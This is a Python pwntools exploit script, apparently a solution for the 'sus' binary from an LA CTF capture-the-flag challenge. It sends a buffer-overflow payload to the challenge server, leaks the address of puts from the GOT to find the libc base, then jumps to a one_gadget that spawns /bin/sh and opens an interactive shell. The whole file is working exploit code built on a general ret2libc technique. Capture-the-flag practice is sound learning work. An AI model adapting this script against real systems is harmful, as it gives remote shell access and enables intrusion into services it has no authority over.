#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF('/home/user/Desktop/lactf/pwn/sus/sus')
rop = ROP(elf)
libc = ELF('/home/user/Desktop/lactf/pwn/sus/libc.so.6')
rop_libc = ROP(libc)

# p = process(
#     ['/home/user/Desktop/lactf/pwn/sus/ld-linux-x86-64.so.2',
#         '/home/user/Desktop/lactf/pwn/sus/sus'], 
#     env={"LD_LIBRARY_PATH":"/home/user/Desktop/lactf/pwn/sus"})

# gdb.attach(p, gdbscript='file ./sus\nb *main+81')
p = remote('chall.lac.tf', 31284)

# BoF -> leak libc
payload = cyclic(56)
payload += p64(elf.got['puts']) # rdi -> puts.got
payload += p64(0x404500) # rw addr -> rbp
payload += p64(elf.sym['main'] + 46) # puts(rdi)

print(p.recv().decode(errors='ignore'))
p.sendline(payload)

resp = p.recv()
puts_addr = u64(resp[:-1].ljust(8, b'\x00'))
print(f"PUTS LEAKED: {hex(puts_addr)}")

libc_addr = puts_addr - 489856
print(f"LIBC LEAKED: {hex(libc_addr)}")

# execve("/bin/sh")
payload = cyclic(56)
payload += p64(0) # rdi -> 0 (one_gadget requirement)
payload += p64(0x404900) # rw addr -> rbp
payload += p64(libc_addr + 0xd509f) # one_gadget

p.sendline(payload)

p.interactive()
